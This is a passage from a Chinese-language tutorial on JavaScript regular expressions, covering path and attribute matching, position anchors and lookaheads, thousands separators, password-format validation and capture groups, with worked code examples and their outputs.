盘符:\文件夹\文件夹\文件夹\</p><p>其中匹配F:\，需要使用<code>[a-zA-Z]:\\</code>，其中盘符不区分大小写，注意<code>\</code>字符需要转义。</p><p>文件名或者文件夹名，不能包含一些特殊字符，此时我们需要排除字符组<code>[^\\:*&lt;&gt;|&quot;?\r\n/]</code>来表示合法字符。另外不能为空名，至少有一个字符，也就是要使用量词<code>+</code>。因此匹配“文件夹\”，可用<code>[^\\:*&lt;&gt;|&quot;?\r\n/]+\\</code>。</p><p>另外“文件夹\”，可以出现任意次。也就是<code>([^\\:*&lt;&gt;|&quot;?\r\n/]+\\)*</code>。其中括号提供子表达式。</p><p>路径的最后一部分可以是“文件夹”，没有<code>\</code>，因此需要添加<code>([^\\:*&lt;&gt;|&quot;?\r\n/]+)?</code>。</p><p>最后拼接成了一个看起来比较复杂的正则：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">var regex = /^[a-zA-Z]:\\([^\\:*&lt;&gt;|&quot;?\r\n/]+\\)*([^\\:*&lt;&gt;|&quot;?\r\n/]+)?$/;</span><br><span class="line">console.log( regex.test(&quot;F:\\study\\javascript\\regex\\regular expression.pdf&quot;) ); </span><br><span class="line">console.log( regex.test(&quot;F:\\study\\javascript\\regex\\&quot;) ); </span><br><span class="line">console.log( regex.test(&quot;F:\\study\\javascript&quot;) ); </span><br><span class="line">console.log( regex.test(&quot;F:\\&quot;) ); </span><br><span class="line">// =&gt; true</span><br><span class="line">// =&gt; true</span><br><span class="line">// =&gt; true</span><br><span class="line">// =&gt; true复制代码</span><br></pre></td></tr></table></figure><p>其中，JS中字符串表示<code>\</code>时，也要转义。</p><p><strong>5.5 匹配id</strong></p><p>要求从</p><blockquote><div id="container" class="main"></div></blockquote><p>提取出id=”container”。</p><p>可能最开始想到的正则是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var regex = /id=&quot;.*&quot;/</span><br><span class="line">var string = &apos;&lt;div id=&quot;container&quot; class=&quot;main&quot;&gt;&lt;/div&gt;&apos;;</span><br><span class="line">console.log(string.match(regex)[0]); </span><br><span class="line">// =&gt; id=&quot;container&quot; class=&quot;main&quot;</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><p>因为<code>.</code>是通配符，本身就匹配双引号的，而量词<code>*</code>又是贪婪的，当遇到container后面双引号时，不会停下来，会继续匹配，直到遇到最后一个双引号为止。</p><p>解决之道，可以使用惰性匹配：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var regex = /id=&quot;.*?&quot;/</span><br><span class="line">var string = &apos;&lt;div id=&quot;container&quot; class=&quot;main&quot;&gt;&lt;/div&gt;&apos;;</span><br><span class="line">console.log(string.match(regex)[0]); </span><br><span class="line">// =&gt; id=&quot;container&quot;</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><p>当然，这样也会有个问题。效率比较低，因为其匹配原理会涉及到“回溯”这个概念（这里也只是顺便提一下，第四章会详细说明）。可以优化如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var regex = /id=&quot;[^&quot;]*&quot;/</span><br><span class="line">var string = &apos;&lt;div id=&quot;container&quot; class=&quot;main&quot;&gt;&lt;/div&gt;&apos;;</span><br><span class="line">console.log(string.match(regex)[0]); </span><br><span class="line">// =&gt; id=&quot;container&quot;复制代码</span><br></pre></td></tr></table></figure><h3 id="第1章-小结"><a href="#第1章-小结" class="headerlink" title="第1章 小结"></a>第1章 小结</h3><p>字符匹配相关的案例，挺多的，不一而足。</p><p>掌握字符组和量词就能解决大部分常见的情形，也就是说，当你会了这二者，JS正则算是入门了。</p><h2 id="第二章-正则表达式位置匹配攻略"><a href="#第二章-正则表达式位置匹配攻略" class="headerlink" title="第二章 正则表达式位置匹配攻略"></a>第二章 正则表达式位置匹配攻略</h2><p>正则表达式是匹配模式，要么匹配字符，要么匹配位置。请记住这句话。</p><p>然而大部分人学习正则时，对于匹配位置的重视程度没有那么高。</p><p>本章讲讲正则匹配位置的总总。</p><p>内容包括：</p><ol><li>什么是位置？</li><li>如何匹配位置？</li><li>位置的特性</li><li>几个应用实例分析</li></ol><h3 id="1-什么是位置呢？"><a href="#1-什么是位置呢？" class="headerlink" title="1. 什么是位置呢？"></a>1. 什么是位置呢？</h3><p>位置是相邻字符之间的位置。比如，下图中箭头所指的地方：</p><p><img src="https://user-gold-cdn.xitu.io/2017/7/19/95d0faf6b21f9414d24c8281b3046746?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt="img"></p><h3 id="2-如何匹配位置呢？"><a href="#2-如何匹配位置呢？" class="headerlink" title="2. 如何匹配位置呢？"></a>2. 如何匹配位置呢？</h3><p>在ES5中，共有6个锚字符：</p><blockquote><p><code>**^**</code> <code>**$**</code> <code>**\b**</code> <code>**\B**</code> <code>**(?=p)**</code> <code>**(?!p)**</code></p></blockquote><p><strong>2.1 ^和$</strong></p><p><code>^</code>（脱字符）匹配开头，在多行匹配中匹配行开头。</p><p><code>$</code>（美元符号）匹配结尾，在多行匹配中匹配行结尾。</p><p>比如我们把字符串的开头和结尾用”#”替换（位置可以替换成字符的！）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var result = &quot;hello&quot;.replace(/^|$/g, &apos;#&apos;);</span><br><span class="line">console.log(result); </span><br><span class="line">// =&gt; &quot;#hello#&quot;</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><p>多行匹配模式时，二者是行的概念，这个需要我们的注意：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">var result = &quot;I\nlove\njavascript&quot;.replace(/^|$/gm, &apos;#&apos;);</span><br><span class="line">console.log(result);</span><br><span class="line">/*</span><br><span class="line">#I#</span><br><span class="line">#love#</span><br><span class="line">#javascript#</span><br><span class="line">*/</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><p><strong>2.2 \b和\B</strong></p><p><code>\b</code>是单词边界，具体就是<code>\w</code>和<code>\W</code>之间的位置，也包括<code>\w</code>和<code>^</code>之间的位置，也包括<code>\w</code>和<code>$</code>之间的位置。</p><p>比如一个文件名是”[JS] Lesson_01.mp4”中的<code>\b</code>，如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var result = &quot;[JS] Lesson_01.mp4&quot;.replace(/\b/g, &apos;#&apos;);</span><br><span class="line">console.log(result); </span><br><span class="line">// =&gt; &quot;[#JS#] #Lesson_01#.#mp4#&quot;</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><p>为什么是这样呢？这需要仔细看看。</p><p>首先，我们知道，<code>\w</code>是字符组<code>[0-9a-zA-Z_]</code>的简写形式，即<code>\w</code>是字母数字或者下划线的中任何一个字符。而<code>\W</code>是排除字符组<code>[^0-9a-zA-Z_]</code>的简写形式，即<code>\W</code>是<code>\w</code>以外的任何一个字符。</p><p>此时我们可以看看”[#JS#] #Lesson_01#.#mp4#”中的每一个”#”，是怎么来的。</p><ul><li>第一个”#”，两边是”[“与”J”，是<code>\W</code>和<code>\w</code>之间的位置。</li><li>第二个”#”，两边是”S”与”]”，也就是<code>\w</code>和<code>\W</code>之间的位置。</li><li>第三个”#”，两边是空格与”L”，也就是<code>\W</code>和<code>\w</code>之间的位置。</li><li>第四个”#”，两边是”1”与”.”，也就是<code>\w</code>和<code>\W</code>之间的位置。</li><li>第五个”#”，两边是”.”与”m”，也就是<code>\W</code>和<code>\w</code>之间的位置。</li><li>第六个”#”，其对应的位置是结尾，但其前面的字符”4”是<code>\w</code>，即<code>\w</code>和<code>$</code>之间的位置。</li></ul><p>知道了<code>\b</code>的概念后，那么<code>\B</code>也就相对好理解了。</p><p><code>\B</code>就是<code>\b</code>的反面的意思，非单词边界。例如在字符串中所有位置中，扣掉<code>\b</code>，剩下的都是<code>\B</code>的。</p><p>具体说来就是<code>\w</code>与<code>\w</code>、<code>\W</code>与<code>\W</code>、<code>^</code>与<code>\W</code>，<code>\W</code>与<code>$</code>之间的位置。</p><p>比如上面的例子，把所有<code>\B</code>替换成”#”：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var result = &quot;[JS] Lesson_01.mp4&quot;.replace(/\B/g, &apos;#&apos;);</span><br><span class="line">console.log(result); </span><br><span class="line">// =&gt; &quot;#[J#S]# L#e#s#s#o#n#_#0#1.m#p#4&quot;</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><p><strong>2.3 (?=p)和(?!p)</strong></p><p><code>(?=p)</code>，其中<code>p</code>是一个子模式，即<code>p</code>前面的位置。</p><p>比如<code>(?=l)</code>，表示’l’字符前面的位置，例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var result = &quot;hello&quot;.replace(/(?=l)/g, &apos;#&apos;);</span><br><span class="line">console.log(result); </span><br><span class="line">// =&gt; &quot;he#l#lo&quot;</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><p>而<code>(?!p)</code>就是<code>(?=p)</code>的反面意思，比如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var result = &quot;hello&quot;.replace(/(?!l)/g, &apos;#&apos;);</span><br><span class="line"></span><br><span class="line">console.log(result); </span><br><span class="line">// =&gt; &quot;#h#ell#o#&quot;</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><p>二者的学名分别是positive lookahead和negative lookahead。</p><p>中文翻译分别是正向先行断言和负向先行断言。</p><p>ES6中，还支持positive lookbehind和negative lookbehind。</p><p>具体是<code>(?&lt;=p)</code>和<code>(?&lt;!p)</code>。</p><p>也有书上把这四个东西，翻译成环视，即看看右边或看看左边。</p><p>但一般书上，没有很好强调这四者是个位置。</p><p>比如<code>(?=p)</code>，一般都理解成：要求接下来的字符与<code>p</code>匹配，但不能包括<code>p</code>的那些字符。</p><p>而在本人看来<code>(?=p)</code>就与<code>^</code>一样好理解，就是<code>p</code>前面的那个位置。</p><h3 id="3-位置的特性"><a href="#3-位置的特性" class="headerlink" title="3. 位置的特性"></a>3. 位置的特性</h3><p>对于位置的理解，我们可以理解成空字符””。</p><p>比如”hello”字符串等价于如下的形式：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;hello&quot; == &quot;&quot; + &quot;h&quot; + &quot;&quot; + &quot;e&quot; + &quot;&quot; + &quot;l&quot; + &quot;&quot; + &quot;l&quot; + &quot;o&quot; + &quot;&quot;;</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><p>也等价于：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;hello&quot; == &quot;&quot; + &quot;&quot; + &quot;hello&quot;</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><p>因此，把<code>/^hello$/</code>写成<code>/^^hello$$$/</code>，是没有任何问题的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var result = /^^hello$$$/.test(&quot;hello&quot;);</span><br><span class="line">console.log(result); </span><br><span class="line">// =&gt; true</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><p>甚至可以写成更复杂的:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var result = /(?=he)^^he(?=\w)llo$\b\b$/.test(&quot;hello&quot;);</span><br><span class="line">console.log(result); </span><br><span class="line">// =&gt; true</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><p>也就是说字符之间的位置，可以写成多个。</p><p>把位置理解空字符，是对位置非常有效的理解方式。</p><h3 id="4-相关案例"><a href="#4-相关案例" class="headerlink" title="4. 相关案例"></a>4. 相关案例</h3><p><strong>4.1 不匹配任何东西的正则</strong></p><p>让你写个正则不匹配任何东西</p><p>easy，<code>/.^/</code></p><p>因为此正则要求只有一个字符，但该字符后面是开头。</p><p><strong>4.2 数字的千位分隔符表示法</strong></p><p>比如把”12345678”，变成”12,345,678”。</p><p>可见是需要把相应的位置替换成”,”。</p><p>思路是什么呢？</p><p><strong>4.2.1 弄出最后一个逗号</strong></p><p>使用<code>(?=\d{3}$)</code>就可以做到：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var result = &quot;12345678&quot;.replace(/(?=\d&#123;3&#125;$)/g, &apos;,&apos;)</span><br><span class="line">console.log(result); </span><br><span class="line">// =&gt; &quot;12345,678&quot;</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><p><strong>4.2.2 弄出所有的逗号</strong></p><p>因为逗号出现的位置，要求后面3个数字一组，也就是<code>\d{3}</code>至少出现一次。</p><p>此时可以使用量词<code>+</code>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var result = &quot;12345678&quot;.replace(/(?=(\d&#123;3&#125;)+$)/g, &apos;,&apos;)</span><br><span class="line">console.log(result); </span><br><span class="line">// =&gt; &quot;12,345,678&quot;</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><p><strong>4.2.3 匹配其余案例</strong></p><p>写完正则后，要多验证几个案例，此时我们会发现问题：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var result = &quot;123456789&quot;.replace(/(?=(\d&#123;3&#125;)+$)/g, &apos;,&apos;)</span><br><span class="line">console.log(result); </span><br><span class="line">// =&gt; &quot;,123,456,789&quot;</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><p>因为上面的正则，仅仅表示把从结尾向前数，一但是3的倍数，就把其前面的位置替换成逗号。因此才会出现这个问题。</p><p>怎么解决呢？我们要求匹配的到这个位置不能是开头。</p><p>我们知道匹配开头可以使用<code>^</code>，但要求这个位置不是开头怎么办？</p><p>easy，<code>(?!^)</code>，你想到了吗？测试如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">var string1 = &quot;12345678&quot;,</span><br><span class="line">string2 = &quot;123456789&quot;;</span><br><span class="line">reg = /(?!^)(?=(\d&#123;3&#125;)+$)/g;</span><br><span class="line"></span><br><span class="line">var result = string1.replace(reg, &apos;,&apos;)</span><br><span class="line">console.log(result); </span><br><span class="line">// =&gt; &quot;12,345,678&quot;</span><br><span class="line"></span><br><span class="line">result = string2.replace(reg, &apos;,&apos;);</span><br><span class="line">console.log(result); </span><br><span class="line">// =&gt; &quot;123,456,789&quot;</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><p><strong>4.2.4 支持其他形式</strong></p><p>如果要把”12345678 123456789”替换成”12,345,678 123,456,789”。</p><p>此时我们需要修改正则，把里面的开头<code>^</code>和结尾<code>$</code>，替换成<code>\b</code>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">var string = &quot;12345678 123456789&quot;,</span><br><span class="line">reg = /(?!\b)(?=(\d&#123;3&#125;)+\b)/g;</span><br><span class="line"></span><br><span class="line">var result = string.replace(reg, &apos;,&apos;)</span><br><span class="line">console.log(result); </span><br><span class="line">// =&gt; &quot;12,345,678 123,456,789&quot;</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><p>其中<code>(?!\b)</code>怎么理解呢？</p><p>要求当前是一个位置，但不是<code>\b</code>前面的位置，其实<code>(?!\b)</code>说的就是<code>\B</code>。</p><p>因此最终正则变成了：<code>/\B(?=(\d{3})+\b)/g</code>。</p><p><strong>4.3 验证密码问题</strong></p><p>密码长度6-12位，由数字、小写字符和大写字母组成，但必须至少包括2种字符。</p><p>此题，如果写成多个正则来判断，比较容易。但要写成一个正则就比较困难。</p><p>那么，我们就来挑战一下。看看我们对位置的理解是否深刻。</p><p><strong>4.3.1 简化</strong></p><p>不考虑“但必须至少包括2种字符”这一条件。我们可以容易写出：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var reg = /^[0-9A-Za-z]&#123;6,12&#125;$/;</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><p><strong>4.3.2 判断是否包含有某一种字符</strong></p><p>假设，要求的必须包含数字，怎么办？此时我们可以使用<code>(?=.*[0-9])</code>来做。</p><p>因此正则变成：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var reg = /(?=.*[0-9])^[0-9A-Za-z]&#123;6,12&#125;$/;</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><p><strong>4.3.3 同时包含具体两种字符</strong></p><p>比如同时包含数字和小写字母，可以用<code>(?=.*[0-9])(?=.*[a-z])</code>来做。</p><p>因此正则变成：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var reg = /(?=.*[0-9])(?=.*[a-z])^[0-9A-Za-z]&#123;6,12&#125;$/;</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><p><strong>4.3.4 解答</strong></p><p>我们可以把原题变成下列几种情况之一：</p><ol><li>同时包含数字和小写字母</li><li>同时包含数字和大写字母</li><li>同时包含小写字母和大写字母</li><li>同时包含数字、小写字母和大写字母</li></ol><p>以上的4种情况是或的关系（实际上，可以不用第4条）。</p><p>最终答案是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">var reg = /((?=.*[0-9])(?=.*[a-z])|(?=.*[0-9])(?=.*[A-Z])|(?=.*[a-z])(?=.*[A-Z]))^[0-9A-Za-z]&#123;6,12&#125;$/;</span><br><span class="line">console.log( reg.test(&quot;1234567&quot;) ); // false 全是数字</span><br><span class="line">console.log( reg.test(&quot;abcdef&quot;) ); // false 全是小写字母</span><br><span class="line">console.log( reg.test(&quot;ABCDEFGH&quot;) ); // false 全是大写字母</span><br><span class="line">console.log( reg.test(&quot;ab23C&quot;) ); // false 不足6位</span><br><span class="line">console.log( reg.test(&quot;ABCDEF234&quot;) ); // true 大写字母和数字</span><br><span class="line">console.log( reg.test(&quot;abcdEF234&quot;) ); // true 三者都有</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><p><strong>4.3.5 解惑</strong></p><p>上面的正则看起来比较复杂，只要理解了第二步，其余就全部理解了。</p><p><code>/(?=.*[0-9])^[0-9A-Za-z]{6,12}$/</code></p><p>对于这个正则，我们只需要弄明白<code>(?=.*[0-9])^</code>即可。</p><p>分开来看就是<code>(?=.*[0-9])</code>和<code>^</code>。</p><p>表示开头前面还有个位置（当然也是开头，即同一个位置，想想之前的空字符类比）。</p><p><code>(?=.*[0-9])</code>表示该位置后面的字符匹配<code>.*[0-9]</code>，即，有任何多个任意字符，后面再跟个数字。</p><p>翻译成大白话，就是接下来的字符，必须包含个数字。</p><p><strong>4.3.6 另外一种解法</strong></p><p>“至少包含两种字符”的意思就是说，不能全部都是数字，也不能全部都是小写字母，也不能全部都是大写字母。</p><p>那么要求“不能全部都是数字”，怎么做呢？<code>(?!p)</code>出马！</p><p>对应的正则是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var reg = /(?!^[0-9]&#123;6,12&#125;$)^[0-9A-Za-z]&#123;6,12&#125;$/;</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><p>三种“都不能”呢？</p><p>最终答案是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">var reg = /(?!^[0-9]&#123;6,12&#125;$)(?!^[a-z]&#123;6,12&#125;$)(?!^[A-Z]&#123;6,12&#125;$)^[0-9A-Za-z]&#123;6,12&#125;$/;</span><br><span class="line">console.log( reg.test(&quot;1234567&quot;) ); // false 全是数字</span><br><span class="line">console.log( reg.test(&quot;abcdef&quot;) ); // false 全是小写字母</span><br><span class="line">console.log( reg.test(&quot;ABCDEFGH&quot;) ); // false 全是大写字母</span><br><span class="line">console.log( reg.test(&quot;ab23C&quot;) ); // false 不足6位</span><br><span class="line">console.log( reg.test(&quot;ABCDEF234&quot;) ); // true 大写字母和数字</span><br><span class="line">console.log( reg.test(&quot;abcdEF234&quot;) ); // true 三者都有</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><h3 id="第二章小结"><a href="#第二章小结" class="headerlink" title="第二章小结"></a>第二章小结</h3><p>位置匹配相关的案例，挺多的，不一而足。</p><p>掌握匹配位置的这6个锚字符，给我们解决正则问题一个新工具。</p><h2 id="第三章-正则表达式括号的作用"><a href="#第三章-正则表达式括号的作用" class="headerlink" title="第三章 正则表达式括号的作用"></a>第三章 正则表达式括号的作用</h2><p>不管哪门语言中都有括号。正则表达式也是一门语言，而括号的存在使这门语言更为强大。</p><p>对括号的使用是否得心应手，是衡量对正则的掌握水平的一个侧面标准。</p><p>括号的作用，其实三言两语就能说明白，括号提供了分组，便于我们引用它。</p><p>引用某个分组，会有两种情形：在JavaScript里引用它，在正则表达式里引用它。</p><p>本章内容虽相对简单，但我也要写长点。</p><p>内容包括：</p><ol><li>分组和分支结构</li><li>捕获分组</li><li>反向引用</li><li>非捕获分组</li><li>相关案例</li></ol><h3 id="1-分组和分支结构"><a href="#1-分组和分支结构" class="headerlink" title="1. 分组和分支结构"></a>1. 分组和分支结构</h3><p>这二者是括号最直觉的作用，也是最原始的功能。</p><p><strong>1.1 分组</strong></p><p>我们知道<code>/a+/</code>匹配连续出现的“a”，而要匹配连续出现的“ab”时，需要使用<code>/(ab)+/</code>。</p><p>其中括号是提供分组功能，使量词<code>+</code>作用于“ab”这个整体，测试如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var regex = /(ab)+/g;</span><br><span class="line">var string = &quot;ababa abbb ababab&quot;;</span><br><span class="line">console.log( string.match(regex) ); </span><br><span class="line">// =&gt; [&quot;abab&quot;, &quot;ab&quot;, &quot;ababab&quot;]</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><p><strong>1.2 分支结构</strong></p><p>而在多选分支结构<code>(p1|p2)</code>中，此处括号的作用也是不言而喻的，提供了子表达式的所有可能。</p><p>比如，要匹配如下的字符串：</p><blockquote><p>I love JavaScript</p><p>I love Regular Expression</p></blockquote><p>可以使用正则：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var regex = /^I love (JavaScript|Regular Expression)$/;</span><br><span class="line">console.log( regex.test(&quot;I love JavaScript&quot;) );</span><br><span class="line">console.log( regex.test(&quot;I love Regular Expression&quot;) );</span><br><span class="line">// =&gt; true</span><br><span class="line">// =&gt; true复制代码</span><br></pre></td></tr></table></figure><p>如果去掉正则中的括号，即<code>/^I love JavaScript|Regular Expression$/</code>，匹配字符串是”I love JavaScript”和”Regular Expression”，当然这不是我们想要的。</p><h3 id="2-引用分组"><a href="#2-引用分组" class="headerlink" title="2. 引用分组"></a>2. 引用分组</h3><p>这是括号一个重要的作用，有了它，我们就可以进行数据提取，以及更强大的替换操作。</p><p>而要使用它带来的好处，必须配合使用实现环境的API。</p><p>以日期为例。假设格式是yyyy-mm-dd的，我们可以先写一个简单的正则：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var regex = /\d&#123;4&#125;-\d&#123;2&#125;-\d&#123;2&#125;/;</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><p>然后再修改成括号版的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var regex = /(\d&#123;4&#125;)-(\d&#123;2&#125;)-(\d&#123;2&#125;)/;</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><p>为什么要使用这个正则呢？</p><p><strong>2.1 提取数据</strong></p><p>比如提取出年、月、日，可以这么做：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var regex = /(\d&#123;4&#125;)-(\d&#123;2&#125;)-(\d&#123;2&#125;)/;</span><br><span class="line">var string = &quot;2017-06-12&quot;;</span><br><span class="line">console.log( string.match(regex) ); </span><br><span class="line">// =&gt; [&quot;2017-06-12&quot;, &quot;2017&quot;, &quot;06&quot;, &quot;12&quot;, index: 0, input: &quot;2017-06-12&quot;]</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><p><code>match</code>返回的一个数组，第一个元素是整体匹配结果，然后是各个分组（括号里）匹配的内容，然后是匹配下标，最后是输入的文本。（注意：如果正则是否有修饰符<code>g</code>，<code>match</code>返回的数组格式是不一样的）。</p><p>另外也可以使用正则对象的<code>exec</code>方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var regex = /(\d&#123;4&#125;)-(\d&#123;2&#125;)-(\d&#123;2&#125;)/;</span><br><span class="line">var string = &quot;2017-06-12&quot;;</span><br><span class="line">console.log( regex.exec(string) ); </span><br><span class="line">// =&gt; [&quot;2017-06-12&quot;, &quot;2017&quot;, &quot;06&quot;, &quot;12&quot;, index: 0, input: &quot;2017-06-12&quot;]</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><p>同时，也可以使用构造函数的全局属性<code>$1</code>至<code>$9</code>来获取：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">var regex = /(\d&#123;4&#125;)-(\d&#123;2&#125;)-(\d&#123;2&#125;)/;</span><br><span class="line">var string = &quot;2017-06-12&quot;;</span><br><span class="line"></span><br><span class="line">regex.test(string); // 正则操作即可，例如</span><br><span class="line">//regex.exec(string);</span><br><span class="line">//string.match(regex);</span><br><span class="line"></span><br><span class="line">console.log(RegExp.$1); // &quot;2017&quot;</span><br><span class="line">console.log(RegExp.$2); // &quot;06&quot;</span><br><span class="line">console.log(RegExp.$3); // &quot;12&quot;</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><p><strong>2.2 替换</strong></p><p>比如，想把yyyy-mm-dd格式，替换成mm/dd/yyyy怎么做？</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">var regex = /(\d&#123;4&#125;)-(\d&#123;2&#125;)-(\d&#123;2&#125;)/;</span><br><span class="line">var string = 